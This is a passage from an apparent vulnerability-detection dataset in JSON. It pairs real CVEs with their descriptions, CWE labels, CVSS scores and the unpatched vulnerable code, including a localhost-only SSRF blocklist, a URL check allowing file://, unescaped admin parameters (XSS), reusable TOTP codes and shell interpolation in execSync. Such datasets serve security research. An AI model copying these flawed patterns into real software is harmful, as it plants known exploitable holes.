Recipe.directory_from_id(self.recipe_id)\n        self.dir_image = self.dir_data.joinpath(\"images\")\n        self.dir_image_timeline = self.dir_image.joinpath(\"timeline\")\n        self.dir_assets = self.dir_data.joinpath(\"assets\")\n\n        for dir in [self.dir_image, self.dir_image_timeline, self.dir_assets]:\n            dir.mkdir(parents=True, exist_ok=True)\n\n    def delete_all_data(self) -> None:\n        try:\n            shutil.rmtree(self.dir_data)\n        except Exception as e:\n            self.logger.exception(f\"Failed to delete recipe data: {e}\")\n\n    def write_image(self, file_data: bytes | Path, extension: str, image_dir: Path | None = None) -> Path:\n        if not image_dir:\n            image_dir = self.dir_image\n\n        extension = extension.replace(\".\", \"\")\n        image_path = image_dir.joinpath(f\"original.{extension}\")\n        image_path.unlink(missing_ok=True)\n\n        if isinstance(file_data, Path):\n            shutil.copy2(file_data, image_path)\n        elif isinstance(file_data, bytes):\n            with open(image_path, \"ab\") as f:\n                f.write(file_data)\n        else:\n            with open(image_path, \"ab\") as f:\n                shutil.copyfileobj(file_data, f)\n\n        self.minifier.minify(image_path)\n\n        return image_path\n\n    @staticmethod\n    def _validate_image_url(url: str) -> bool:\n        # sourcery skip: invert-any-all, use-any\n        \"\"\"\n        Validates that the URL is of an allowed source and restricts certain sources to prevent\n        malicious images from being downloaded.\n        \"\"\"\n        invalid_domains = {\"127.0.0.1\", \"localhost\"}\n        for domain in invalid_domains:\n            if domain in url:\n                return False\n\n        return True\n\n    async def scrape_image(self, image_url) -> None:\n        self.logger.info(f\"Image URL: {image_url}\")\n\n        if not self._validate_image_url(image_url):\n            self.logger.error(f\"Invalid image URL: {image_url}\")\n            raise InvalidDomainError(f\"Invalid domain: {image_url}\")\n\n        if isinstance(image_url, str):  # Handles String Types\n            pass\n\n        elif isinstance(image_url, list):  # Handles List Types\n            # Multiple images have been defined in the schema - usually different resolutions\n            # Typically would be in smallest->biggest order, but can't be certain so test each.\n            # 'Google will pick the best image to display in Search results based on the aspect ratio and resolution.'\n            image_url, _ = await largest_content_len(image_url)\n\n        elif isinstance(image_url, dict):  # Handles Dictionary Types\n            for key in image_url:\n                if key == \"url\":\n                    image_url = image_url.get(\"url\")\n\n        ext = image_url.split(\".\")[-1]\n\n        if ext not in img.IMAGE_EXTENSIONS:\n            ext = \"jpg\"  # Guess the extension\n\n        file_name = f\"{str(self.recipe_id)}.{ext}\"\n        file_path = Recipe.directory_from_id(self.recipe_id).joinpath(\"images\", file_name)\n\n        async with AsyncClient() as client:\n            try:\n                r = await client.get(image_url, headers={\"User-Agent\": _FIREFOX_UA})\n            except Exception:\n                self.logger.exception(\"Fatal Image Request Exception\")\n                return None\n\n            if r.status_code != 200:\n                # TODO: Probably should throw an exception in this case as well, but before these changes\n                # we were returning None if it failed anyways.\n                return None\n\n            content_type = r.headers.get(\"content-type\", \"\")\n\n            if \"image\" not in content_type:\n                self.logger.error(f\"Content-Type: {content_type} is not an image\")\n                raise NotAnImageError(f\"Content-Type {content_type} is not an image\")\n\n            self.logger.debug(f\"File Name Suffix {file_path.suffix}\")\n            self.write_image(r.read(), file_path.suffix)\n            file_path.unlink(missing_ok=True)\n"
        }
      ],
      "method_level": [
        "def _validate_image_url(url: str) -> bool:\n        # sourcery skip: invert-any-all, use-any\n        \"\"\"\n        Validates that the URL is of an allowed source and restricts certain sources to prevent\n        malicious images from being downloaded.\n        \"\"\"\n        invalid_domains = {\"127.0.0.1\", \"localhost\"}\n        for domain in invalid_domains:\n            if domain in url:\n                return False\n\n        return True"
      ],
      "hunk_level": [
        {
          "line_no": 105,
          "content": "    def _validate_image_url(url: str) -> bool:"
        },
        {
          "line_no": 106,
          "content": "        # sourcery skip: invert-any-all, use-any"
        },
        {
          "line_no": 107,
          "content": "        \"\"\""
        },
        {
          "line_no": 108,
          "content": "        Validates that the URL is of an allowed source and restricts certain sources to prevent"
        },
        {
          "line_no": 109,
          "content": "        malicious images from being downloaded."
        },
        {
          "line_no": 110,
          "content": "        \"\"\""
        },
        {
          "line_no": 111,
          "content": "        invalid_domains = {\"127.0.0.1\", \"localhost\"}"
        },
        {
          "line_no": 112,
          "content": "        for domain in invalid_domains:"
        },
        {
          "line_no": 113,
          "content": "            if domain in url:"
        },
        {
          "line_no": 114,
          "content": "                return False"
        },
        {
          "line_no": 116,
          "content": "        return True"
        }
      ]
    },
    "cwe": [
      "CWE-918"
    ],
    "severity": "MEDIUM",
    "cvss_score": 6.2,
    "cvss_version": 3.1
  },
  {
    "id": 350,
    "cve": "CVE-2024-0440",
    "description": "Attacker, with permission to submit a link or submits a link via POST  to be collected that is using the file:// protocol can then introspect host files and other relatively stored files.",
    "vulnerability": {
      "file_level": [
        {
          "name": "collector/utils/url/index.js",
          "content": "function validURL(url) {\n  try {\n    new URL(url);\n    return true;\n  } catch {}\n  return false;\n}\n\nmodule.exports = {\n  validURL,\n};\n"
        }
      ],
      "method_level": [
        "function validURL(url) {\n  try {\n    new URL(url);\n    return true;\n  } catch {}\n  return false;\n}"
      ],
      "hunk_level": [
        {
          "line_no": 3,
          "content": "    new URL(url);"
        }
      ]
    },
    "cwe": [
      "CWE-918"
    ],
    "severity": "MEDIUM",
    "cvss_score": 6.5,
    "cvss_version": 3.1
  },
  {
    "id": 908,
    "cve": "CVE-2024-38368",
    "description": "trunk.cocoapods.org is the authentication server for the CoacoaPods dependency manager. A vulnerability affected older pods which migrated from the pre-2014 pull request workflow to trunk. If the pods had never been claimed then it was still possible to do so. It was also possible to have all owners removed from a pod, and that made the pod available for the same claiming system. This was patched server-side in commit 71be5440906b6bdfbc0bcc7f8a9fec33367ea0f4 in September 2023.",
    "vulnerability": {
      "file_level": [
        {
          "name": "app/controllers/claims_controller.rb",
          "content": "require 'app/controllers/app_controller'\nrequire 'app/models/dispute'\nrequire 'app/controllers/slack_controller'\n\nrequire 'active_support/core_ext/object/to_query'\nrequire 'sinatra/twitter-bootstrap'\nrequire 'slim'\nrequire 'rest'\n\nmodule Pod\n  module TrunkApp\n    class ClaimsController < HTMLController\n      configure do\n        set :views, settings.root + '/app/views/claims'\n      end\n\n      configure :development do\n        register Sinatra::Reloader\n      end\n\n      def shared_partial(*sources)\n        sources.inject([]) do |combined, source|\n          combined << Slim::Template.new(\"shared/includes/_#{source}.slim\", {}).render\n        end.join\n      end\n\n      # --- Claims --------------------------------------------------------------------------------\n\n      get '/new' do\n        @owner = Owner.new\n        @pods = []\n        slim :new\n      end\n\n      post '/' do\n        find_owner\n        find_pods\n        if @owner.valid? && valid_pods?\n          change_ownership\n          if all_pods_already_claimed?\n            query = {\n              :claimer_email => @owner.email,\n              :pods => @already_claimed_pods,\n            }\n            redirect to(\"/disputes/new?#{query.to_query}\")\n          else\n            query = {\n              :claimer_email => @owner.email,\n              :successfully_claimed => @successfully_claimed_pods,\n              :already_claimed => @already_claimed_pods,\n            }\n            redirect to(\"/thanks?#{query.to_query}\")\n          end\n        end\n        prepare_errors\n        slim :new\n      end\n\n      get '/thanks' do\n        slim :thanks\n      end\n\n      # --- Disputes ------------------------------------------------------------------------------\n\n      get '/disputes/new' do\n        @pods = params[:pods].map { |name| Pod.find_by_name(name) }\n        slim :'disputes/new'\n      end\n\n      post '/disputes' do\n        claimer = Owner.find_by_email(params[:dispute][:claimer_email])\n        dispute = Dispute.create(:claimer => claimer, :message => params[:dispute][:message])\n        SlackController.notify_slack_of_new_dispute(dispute)\n        redirect to('/disputes/thanks')\n      end\n\n      get '/disputes/thanks' do\n        slim :'disputes/thanks'\n      end\n\n      # --- Assets ------------------------------------------------------------------------------\n\n      get '/claims.css' do\n        scss :claims, :style => :expanded\n      end\n\n      private\n\n      def find_owner\n        owner_email, owner_name = params[:owner].values_at('email', 'name')\n        @owner = Owner.find_or_initialize_by_email_and_name(owner_email, owner_name)\n      end\n\n      def find_pods\n        @pods = []\n        @invalid_pods = []\n        unless params[:pods].blank?\n          params[:pods].map(&:strip).uniq.each do |pod_name|\n            next if pod_name.blank?\n\n            if pod = Pod.find_by_name(pod_name)\n              @pods << pod\n            else\n              @invalid_pods << pod_name\n            end\n          end\n        end\n      end\n\n      def valid_pods?\n        !@pods.empty? && @invalid_pods.empty?\n      end\n\n      def all_pods_already_claimed?\n        @successfully_claimed_pods.empty? && !@already_claimed_pods.empty?\n      end\n\n      def prepare_errors\n        @errors = @owner.errors.full_messages.map { |message| \"Owner #{message}.\" }\n        if !@invalid_pods.empty?\n          @errors << \"Unknown #{'Pod'.pluralize(@invalid_pods.size)} #{@invalid_pods.to_sentence}.\"\n        elsif @pods.empty?\n          @errors << 'No Pods specified.'\n        end\n      end\n\n      def change_ownership\n        @successfully_claimed_pods = []\n        @already_claimed_pods = []\n        DB.test_safe_transaction do\n          @owner.save_changes(:raise_on_save_failure => true)\n          unclaimed_owner = Owner.unclaimed\n          @pods.each do |pod|\n            if pod.owners == [unclaimed_owner]\n              @owner.add_pod(pod)\n              pod.remove_owner(unclaimed_owner)\n              @successfully_claimed_pods << pod.name\n            else\n              @already_claimed_pods << pod.name\n            end\n          end\n        end\n      end\n    end\n  end\nend\n"
        }
      ],
      "method_level": [
        "def all_pods_already_claimed?\n        @successfully_claimed_pods.empty? && !@already_claimed_pods.empty?\n      end",
        "def change_ownership\n        @successfully_claimed_pods = []\n        @already_claimed_pods = []\n        DB.test_safe_transaction do\n          @owner.save_changes(:raise_on_save_failure => true)\n          unclaimed_owner = Owner.unclaimed\n          @pods.each do |pod|\n            if pod.owners == [unclaimed_owner]\n              @owner.add_pod(pod)\n              pod.remove_owner(unclaimed_owner)\n              @successfully_claimed_pods << pod.name\n            else\n              @already_claimed_pods << pod.name\n            end\n          end\n        end\n      end"
      ],
      "hunk_level": [
        {
          "line_no": 114,
          "content": "      def all_pods_already_claimed?"
        },
        {
          "line_no": 115,
          "content": "        @successfully_claimed_pods.empty? && !@already_claimed_pods.empty?"
        },
        {
          "line_no": 116,
          "content": "      end"
        },
        {
          "line_no": 127,
          "content": "      def change_ownership"
        },
        {
          "line_no": 128,
          "content": "        @successfully_claimed_pods = []"
        },
        {
          "line_no": 129,
          "content": "        @already_claimed_pods = []"
        },
        {
          "line_no": 130,
          "content": "        DB.test_safe_transaction do"
        },
        {
          "line_no": 131,
          "content": "          @owner.save_changes(:raise_on_save_failure => true)"
        },
        {
          "line_no": 132,
          "content": "          unclaimed_owner = Owner.unclaimed"
        },
        {
          "line_no": 133,
          "content": "          @pods.each do |pod|"
        },
        {
          "line_no": 134,
          "content": "            if pod.owners == [unclaimed_owner]"
        },
        {
          "line_no": 135,
          "content": "              @owner.add_pod(pod)"
        },
        {
          "line_no": 136,
          "content": "              pod.remove_owner(unclaimed_owner)"
        },
        {
          "line_no": 137,
          "content": "              @successfully_claimed_pods << pod.name"
        },
        {
          "line_no": 138,
          "content": "            else"
        },
        {
          "line_no": 139,
          "content": "              @already_claimed_pods << pod.name"
        },
        {
          "line_no": 140,
          "content": "            end"
        },
        {
          "line_no": 141,
          "content": "          end"
        },
        {
          "line_no": 142,
          "content": "        end"
        },
        {
          "line_no": 143,
          "content": "      end"
        }
      ]
    },
    "cwe": [
      "CWE-668"
    ],
    "severity": "CRITICAL",
    "cvss_score": 9.3,
    "cvss_version": 3.1
  },
  {
    "id": 285,
    "cve": "CVE-2024-25122",
    "description": "sidekiq-unique-jobs is an open source project which prevents simultaneous Sidekiq jobs with the same unique arguments to run. Specially crafted GET request parameters handled by any of the following endpoints of sidekiq-unique-jobs' \"admin\" web UI, allow a super-user attacker, or an unwitting, but authorized, victim, who has received a disguised / crafted link, to successfully execute malicious code, which could potentially steal cookies, session data, or local storage data from the app the sidekiq-unique-jobs web UI is mounted in. 1. `/changelogs`, 2. `/locks` or 3. `/expiring_locks`. This issue has been addressed in versions 7.1.33 and 8.0.7. Users are advised to upgrade. There are no known workarounds for this vulnerability.\n",
    "vulnerability": {
      "file_level": [
        {
          "name": "lib/sidekiq_unique_jobs/web.rb",
          "content": "# frozen_string_literal: true\n\nrequire_relative \"web/helpers\"\n\nmodule SidekiqUniqueJobs\n  # Utility module to help manage unique keys in redis.\n  # Useful for deleting keys that for whatever reason wasn't deleted\n  # @author Mikael Henriksson <mikael@mhenrixon.com>\n  module Web\n    def self.registered(app) # rubocop:disable Metrics/MethodLength, Metrics/AbcSize, Metrics/CyclomaticComplexity, Metrics/PerceivedComplexity\n      app.helpers do\n        include Web::Helpers\n      end\n\n      app.get \"/changelogs\" do\n        @filter         = params[:filter] || \"*\"\n        @filter         = \"*\" if @filter == \"\"\n        @count          = (params[:count] || 100).to_i\n        @current_cursor = params[:cursor].to_i\n        @prev_cursor    = params[:prev_cursor].to_i\n        @total_size, @next_cursor, @changelogs = changelog.page(\n          cursor: @current_cursor,\n          pattern: @filter,\n          page_size: @count,\n        )\n\n        erb(unique_template(:changelogs))\n      end\n\n      app.get \"/changelogs/delete_all\" do\n        changelog.clear\n        redirect_to :changelogs\n      end\n\n      app.get \"/locks\" do\n        @filter         = params[:filter] || \"*\"\n        @filter         = \"*\" if @filter == \"\"\n        @count          = (params[:count] || 100).to_i\n        @current_cursor = params[:cursor].to_i\n        @prev_cursor    = params[:prev_cursor].to_i\n\n        @total_size, @next_cursor, @locks = digests.page(\n          cursor: @current_cursor,\n          pattern: @filter,\n          page_size: @count,\n        )\n\n        erb(unique_template(:locks))\n      end\n\n      app.get \"/expiring_locks\" do\n        @filter         = params[:filter] || \"*\"\n        @filter         = \"*\" if @filter == \"\"\n        @count          = (params[:count] || 100).to_i\n        @current_cursor = params[:cursor].to_i\n        @prev_cursor    = params[:prev_cursor].to_i\n\n        @total_size, @next_cursor, @locks = expiring_digests.page(\n          cursor: @current_cursor,\n          pattern: @filter,\n          page_size: @count,\n        )\n\n        erb(unique_template(:locks))\n      end\n\n      app.get \"/locks/delete_all\" do\n        digests.delete_by_pattern(\"*\", count: digests.count)\n        expiring_digests.delete_by_pattern(\"*\", count: digests.count)\n        redirect_to :locks\n      end\n\n      app.get \"/locks/:digest\" do\n        @digest = params[:digest]\n        @lock   = SidekiqUniqueJobs::Lock.new(@digest)\n\n        erb(unique_template(:lock))\n      end\n\n      app.get \"/locks/:digest/delete\" do\n        digests.delete_by_digest(params[:digest])\n        expiring_digests.delete_by_digest(params[:digest])\n        redirect_to :locks\n      end\n\n      app.get \"/locks/:digest/jobs/:job_id/delete\" do\n        @digest = params[:digest]\n        @lock   = SidekiqUniqueJobs::Lock.new(@digest)\n        @lock.unlock(params[:job_id])\n\n        redirect_to \"locks/#{@lock.key}\"\n      end\n    end\n  end\nend\n\nbegin\n  require \"delegate\" unless defined?(DelegateClass)\n  require \"sidekiq/web\" unless defined?(Sidekiq::Web)\n\n  Sidekiq::Web.register(SidekiqUniqueJobs::Web)\n  Sidekiq::Web.tabs[\"Locks\"]          = \"locks\"\n  Sidekiq::Web.tabs[\"Expiring Locks\"] = \"expiring_locks\"\n  Sidekiq::Web.tabs[\"Changelogs\"]     = \"changelogs\"\n  Sidekiq::Web.settings.locales << File.join(File.dirname(__FILE__), \"locales\")\nrescue NameError, LoadError => ex\n  SidekiqUniqueJobs.logger.error(ex)\nend\n"
        }
      ],
      "method_level": [
        "def self.registered(app) # rubocop:disable Metrics/MethodLength, Metrics/AbcSize, Metrics/CyclomaticComplexity, Metrics/PerceivedComplexity\n      app.helpers do\n        include Web::Helpers\n      end\n\n      app.get \"/changelogs\" do\n        @filter         = params[:filter] || \"*\"\n        @filter         = \"*\" if @filter == \"\"\n        @count          = (params[:count] || 100).to_i\n        @current_cursor = params[:cursor].to_i\n        @prev_cursor    = params[:prev_cursor].to_i\n        @total_size, @next_cursor, @changelogs = changelog.page(\n          cursor: @current_cursor,\n          pattern: @filter,\n          page_size: @count,\n        )\n\n        erb(unique_template(:changelogs))\n      end\n\n      app.get \"/changelogs/delete_all\" do\n        changelog.clear\n        redirect_to :changelogs\n      end\n\n      app.get \"/locks\" do\n        @filter         = params[:filter] || \"*\"\n        @filter         = \"*\" if @filter == \"\"\n        @count          = (params[:count] || 100).to_i\n        @current_cursor = params[:cursor].to_i\n        @prev_cursor    = params[:prev_cursor].to_i\n\n        @total_size, @next_cursor, @locks = digests.page(\n          cursor: @current_cursor,\n          pattern: @filter,\n          page_size: @count,\n        )\n\n        erb(unique_template(:locks))\n      end\n\n      app.get \"/expiring_locks\" do\n        @filter         = params[:filter] || \"*\"\n        @filter         = \"*\" if @filter == \"\"\n        @count          = (params[:count] || 100).to_i\n        @current_cursor = params[:cursor].to_i\n        @prev_cursor    = params[:prev_cursor].to_i\n\n        @total_size, @next_cursor, @locks = expiring_digests.page(\n          cursor: @current_cursor,\n          pattern: @filter,\n          page_size: @count,\n        )\n\n        erb(unique_template(:locks))\n      end\n\n      app.get \"/locks/delete_all\" do\n        digests.delete_by_pattern(\"*\", count: digests.count)\n        expiring_digests.delete_by_pattern(\"*\", count: digests.count)\n        redirect_to :locks\n      end\n\n      app.get \"/locks/:digest\" do\n        @digest = params[:digest]\n        @lock   = SidekiqUniqueJobs::Lock.new(@digest)\n\n        erb(unique_template(:lock))\n      end\n\n      app.get \"/locks/:digest/delete\" do\n        digests.delete_by_digest(params[:digest])\n        expiring_digests.delete_by_digest(params[:digest])\n        redirect_to :locks\n      end\n\n      app.get \"/locks/:digest/jobs/:job_id/delete\" do\n        @digest = params[:digest]\n        @lock   = SidekiqUniqueJobs::Lock.new(@digest)\n        @lock.unlock(params[:job_id])\n\n        redirect_to \"locks/#{@lock.key}\"\n      end\n    end"
      ],
      "hunk_level": [
        {
          "line_no": 16,
          "content": "        @filter         = params[:filter] || \"*\""
        },
        {
          "line_no": 18,
          "content": "        @count          = (params[:count] || 100).to_i"
        },
        {
          "line_no": 19,
          "content": "        @current_cursor = params[:cursor].to_i"
        },
        {
          "line_no": 20,
          "content": "        @prev_cursor    = params[:prev_cursor].to_i"
        },
        {
          "line_no": 36,
          "content": "        @filter         = params[:filter] || \"*\""
        },
        {
          "line_no": 38,
          "content": "        @count          = (params[:count] || 100).to_i"
        },
        {
          "line_no": 39,
          "content": "        @current_cursor = params[:cursor].to_i"
        },
        {
          "line_no": 40,
          "content": "        @prev_cursor    = params[:prev_cursor].to_i"
        },
        {
          "line_no": 52,
          "content": "        @filter         = params[:filter] || \"*\""
        },
        {
          "line_no": 54,
          "content": "        @count          = (params[:count] || 100).to_i"
        },
        {
          "line_no": 55,
          "content": "        @current_cursor = params[:cursor].to_i"
        },
        {
          "line_no": 56,
          "content": "        @prev_cursor    = params[:prev_cursor].to_i"
        },
        {
          "line_no": 74,
          "content": "        @digest = params[:digest]"
        },
        {
          "line_no": 81,
          "content": "        digests.delete_by_digest(params[:digest])"
        },
        {
          "line_no": 82,
          "content": "        expiring_digests.delete_by_digest(params[:digest])"
        },
        {
          "line_no": 87,
          "content": "        @digest = params[:digest]"
        }
      ]
    },
    "cwe": [
      "CWE-79"
    ],
    "severity": "HIGH",
    "cvss_score": 7.1,
    "cvss_version": 3.1
  },
  {
    "id": 1000,
    "cve": "CVE-2024-41800",
    "description": "Craft is a content management system (CMS). Craft CMS 5 allows reuse of TOTP tokens multiple times within the validity period. An attacker is able to re-submit a valid TOTP token to establish an authenticated session. This requires that the attacker has knowledge of the victim's credentials. This has been patched in Craft 5.2.3.",
    "vulnerability": {
      "file_level": [
        {
          "name": "src/auth/methods/TOTP.php",
          "content": "<?php\n/**\n * @link https://craftcms.com/\n * @copyright Copyright (c) Pixel & Tonic, Inc.\n * @license https://craftcms.github.io/license/\n */\n\nnamespace craft\\auth\\methods;\n\nuse BaconQrCode\\Renderer\\Image\\SvgImageBackEnd;\nuse BaconQrCode\\Renderer\\ImageRenderer;\nuse BaconQrCode\\Renderer\\RendererStyle\\RendererStyle;\nuse BaconQrCode\\Writer;\nuse Craft;\nuse craft\\records\\Authenticator as AuthenticatorRecord;\nuse craft\\web\\assets\\totp\\TotpAsset;\nuse craft\\web\\Session;\nuse craft\\web\\View;\nuse PragmaRX\\Google2FA\\Exceptions\\Google2FAException;\nuse PragmaRX\\Google2FA\\Google2FA;\nuse yii\\web\\ForbiddenHttpException;\n\n/**\n * Time-based one-time password authentication method.\n *\n * @author Pixel & Tonic, Inc. <support@pixelandtonic.com>\n * @since 5.0.0\n */\nclass TOTP extends BaseAuthMethod\n{\n    /**\n     * @var string The session variable name used to store the authenticator\n     * secret while setting up this method.\n     */\n    public string $secretParam;\n\n    /**\n     * @inheritdoc\n     */\n    public static function displayName(): string\n    {\n        return Craft::t('app', 'Authenticator App');\n    }\n\n    /**\n     * @inheritdoc\n     */\n    public static function description(): string\n    {\n        return Craft::t('app', 'Use an authenticator app to verify your identity.');\n    }\n\n    /**\n     * @inheritdoc\n     */\n    public function init(): void\n    {\n        parent::init();\n\n        if (!isset($this->secretParam)) {\n            $stateKeyPrefix = md5(sprintf('Craft.%s.%s.%s', Session::class, Craft::$app->id, $this->user->id));\n            $this->secretParam = sprintf('%s__secret', $stateKeyPrefix);\n        }\n    }\n\n    /**\n     * @inheritdoc\n     */\n    public function isActive(): bool\n    {\n        return self::secretFromDb($this->user->id) !== null;\n    }\n\n    /**\n     * @inheritdoc\n     */\n    public function getSetupHtml(string $containerId): string\n    {\n        $secret = $this->secret();\n        $totpFormId = sprintf('totp-form-%s', mt_rand());\n        $view = Craft::$app->getView();\n\n        $view->registerAssetBundle(TotpAsset::class);\n        $view->registerJsWithVars(fn($totpFormId, $containerId) => <<<JS\nCraft.createAuthFormHandler(Craft.TotpForm.METHOD, $('#' + $totpFormId), () => {\n  Craft.Slideout.instances[$containerId].showSuccess();\n  Craft.authMethodSetup.refresh();\n});\nJS, [\n            $view->namespaceInputId($totpFormId),\n            $containerId,\n        ]);\n\n        return $view->renderTemplate('_components/auth/methods/TOTP/setup.twig', [\n            'secret' => $secret,\n            'user' => $this->user,\n            'qrCode' => $this->generateQrCode($secret),\n            'totpFormId' => $totpFormId,\n        ], View::TEMPLATE_MODE_CP);\n    }\n\n    /**\n     * @inheritdoc\n     */\n    public function getAuthFormHtml(): string\n    {\n        $view = Craft::$app->getView();\n        $view->registerAssetBundle(TotpAsset::class);\n        return $view->renderTemplate('_components/auth/methods/TOTP/form.twig');\n    }\n\n    /**\n     * @inheritdoc\n     */\n    public function verify(mixed ...$args): bool\n    {\n        [$code] = $args;\n        if ($code === '') {\n            return false;\n        }\n\n        $storedSecret = self::secretFromDb($this->user->id);\n        $secret = $storedSecret ?? Craft::$app->getSession()->get($this->secretParam);\n\n        if (!$secret) {\n            return false;\n        }\n\n        try {\n            $verified = (new Google2FA())->verifyKey($secret, $code);\n        } catch (Google2FAException) {\n            return false;\n        }\n\n        if (!$verified) {\n            return false;\n        }\n\n        if (!$storedSecret) {\n            $this->storeSecret($this->user->id, $secret);\n            Craft::$app->getSession()->remove($this->secretParam);\n        }\n\n        return true;\n    }\n\n    /**\n     * @inheritdoc\n     */\n    public function remove(): void\n    {\n        AuthenticatorRecord::deleteAll([\n            'userId' => $this->user->id,\n        ]);\n    }\n\n    private function secret(): string\n    {\n        $google2fa = new Google2FA();\n        $secret = self::secretFromDb($this->user->id);\n\n        if (empty($secret)) {\n            try {\n                $secret = $google2fa->generateSecretKey(32);\n                Craft::$app->getSession()->set($this->secretParam, $secret);\n            } catch (\\Exception $e) {\n                Craft::$app->getErrorHandler()->logException($e);\n            }\n        }\n\n        return chunk_split($secret, 4, ' ');\n    }\n\n    private static function secretFromDb(int $userId): ?string\n    {\n        $record = AuthenticatorRecord::find()\n            ->select(['auth2faSecret'])\n            ->where(['userId' => $userId])\n            ->one();\n\n        return $record ? $record['auth2faSecret'] : null;\n    }\n\n    private function storeSecret(int $userId, string $secret): void\n    {\n        // Make sure they have an elevated session first\n        if (!Craft::$app->getUser()->getHasElevatedSession()) {\n            throw new ForbiddenHttpException(Craft::t('app', 'This action may only be performed with an elevated session.'));\n        }\n\n        /** @var AuthenticatorRecord|null $record */\n        $record = AuthenticatorRecord::find()\n            ->where(['userId' => $userId])\n            ->one();\n\n        if (!$record) {\n            $record = new AuthenticatorRecord();\n            $record->userId = $userId;\n        }\n\n        $record->auth2faSecret = $secret;\n        $record->save();\n    }\n\n    private function generateQrCode(string $secret): string\n    {\n        $qrCodeUrl = (new Google2FA())->getQRCodeUrl(\n            Craft::$app->getSystemName(),\n            $this->user->email,\n            $secret,\n        );\n\n        $renderer = new ImageRenderer(\n            new RendererStyle(150, 0),\n            new SvgImageBackEnd()\n        );\n\n        return (new Writer($renderer))->writeString($qrCodeUrl);\n    }\n}\n"
        }
      ],
      "method_level": [
        "public function verify(mixed ...$args): bool\n    {\n        [$code] = $args;\n        if ($code === '') {\n            return false;\n        }\n\n        $storedSecret = self::secretFromDb($this->user->id);\n        $secret = $storedSecret ?? Craft::$app->getSession()->get($this->secretParam);\n\n        if (!$secret) {\n            return false;\n        }\n\n        try {\n            $verified = (new Google2FA())->verifyKey($secret, $code);\n        } catch (Google2FAException) {\n            return false;\n        }\n\n        if (!$verified) {\n            return false;\n        }\n\n        if (!$storedSecret) {\n            $this->storeSecret($this->user->id, $secret);\n            Craft::$app->getSession()->remove($this->secretParam);\n        }\n\n        return true;\n    }"
      ],
      "hunk_level": [
        {
          "line_no": 130,
          "content": "            $verified = (new Google2FA())->verifyKey($secret, $code);"
        }
      ]
    },
    "cwe": [
      "CWE-287"
    ],
    "severity": "MEDIUM",
    "cvss_score": 4.8,
    "cvss_version": 3.1
  },
  {
    "id": 930,
    "cve": "CVE-2024-39943",
    "description": "rejetto HFS (aka HTTP File Server) 3 before 0.52.10 on Linux, UNIX, and macOS allows OS command execution by remote authenticated users (if they have Upload permissions). This occurs because a shell is used to execute df (i.e., with execSync instead of spawnSync in child_process in Node.js).",
    "vulnerability": {
      "file_level": [
        {
          "name": "src/util-os.ts",
          "content": "import { dirname, resolve } from 'path'\nimport { existsSync } from 'fs'\nimport { exec, execSync } from 'child_process'\nimport { onlyTruthy, splitAt, try_ } from './misc'\nimport _ from 'lodash'\nimport { pid } from 'node:process'\nimport { promisify } from 'util'\nimport { IS_WINDOWS } from './const'\n\nexport function getDiskSpaceSync(path: string) {\n    if (IS_WINDOWS) {\n        const drive = resolve(path).slice(0, 2).toUpperCase()\n        const out = execSync('wmic logicaldisk get Size,FreeSpace,Name /format:list').toString().replace(/\\r/g, '')\n        const one = parseKeyValueObjects(out).find(x => x.Name === drive)\n        if (!one)\n            throw Error('miss')\n        return { free: Number(one.FreeSpace), total: Number(one.Size) }\n    }\n    while (path && !existsSync(path))\n        path = dirname(path)\n    const out = try_(() => execSync(`df -k \"${path}\"`).toString(),\n        err => { throw err.status === 1 ? Error('miss') : err.status === 127 ? Error('unsupported') : err })\n    if (!out?.startsWith('Filesystem'))\n        throw Error('unsupported')\n    const one = out.split('\\n')[1] as string\n    const [used, free] = one.split(/\\s+/).slice(2, 4).map(x => Number(x) * 1024) as [number, number]\n    return { free, total: used + free }\n}\n\nexport async function getDiskSpaces(): Promise<{ name: string, free: number, total: number, description?: string }[]> {\n    if (IS_WINDOWS) {\n        const fields = ['Size','FreeSpace','Name','Description'] as const\n        const out = await runCmd(`wmic logicaldisk get ${fields.join()} /format:list`)\n        const objs = parseKeyValueObjects<typeof fields[number]>(out)\n        return onlyTruthy(objs.map(x => x.Size && {\n            total: Number(x.Size),\n            free: Number(x.FreeSpace),\n            name: x.Name,\n            description: x.Description\n        }))\n    }\n    const { stdout } = await promisify(exec)(`df -k -l`).catch(err => {\n        throw err.status === 1 ? Error('miss')\n            : err.status === 127 ? Error('unsupported')\n                : err\n    })\n    const out = stdout.split('\\n')\n    if (!out.shift()?.startsWith('Filesystem'))\n        throw Error('unsupported')\n    return onlyTruthy(out.map(one => {\n        const bits = one.split(/\\s+/)\n        const name = bits.pop() || bits.shift() || ''\n        const [, used=0, free=0] = bits.map(x => Number(x) * 1024)\n        const total = used + free\n        return total && { free, total, name }\n    }))\n}\n\nexport async function getDrives() {\n    const stdout = await runCmd('wmic logicaldisk get name')\n    return stdout.split('\\n').slice(1).map(x => x.trim()).filter(Boolean)\n}\n\n// execute win32 shell commands\nexport async function runCmd(cmd: string, args: string[] = []) {\n    const { stdout, stderr } = await promisify(exec)(`@chcp 65001 >nul & cmd /c ${cmd} ${args.join(' ')}`, { encoding: 'utf-8' })\n    return (stderr || stdout).replace(/\\r/g, '')\n}\n\nasync function getWindowsServicePids() {\n    const res = await runCmd(`wmic service get ProcessId`)\n    return _.uniq(res.split('\\n').slice(1).map(x => Number(x.trim())))\n}\n\nexport const RUNNING_AS_SERVICE = IS_WINDOWS && getWindowsServicePids().then(x => x.includes(pid))\n\nfunction parseKeyValueObjects<T extends string>(all: string, keySep='=', lineSep='\\n', objectSep=/\\n\\n+/) {\n    return all.split(objectSep).map(obj =>\n        Object.fromEntries(obj.split(lineSep).map(kv => splitAt(keySep, kv))) ) as { [k in T]: string }[]\n}"
        }
      ],
      "method_level": [
        "getDiskSpaceSync"
      ],
      "hunk_level": [
        {
          "line_no": 21,
          "content": "    const out = try_(() => execSync(`df -k \"${path}\"`).toString(),"
        }
      ]
    },
    "cwe": [
      "CWE-78",
      "CWE-284"
    ],
    "severity": "CRITICAL",
    "cvss_score": 9.9,
    "cvss_version": 3.1
  },
  {
    "id": 21,
    "cve": "CVE-2025-23211",
    "description": "Tandoor Recipes is an application for managing recipes, planning meals, and building shopping lists. A Jinja2 SSTI vulnerability allows any user to execute commands on the server. In the case of the provided Docker Compose file as root. This vulnerability is fixed in 1.5.24.",
    "vulnerability": {
      "file_level": [
        {
          "name": "cookbook/helper/template_helper.py",
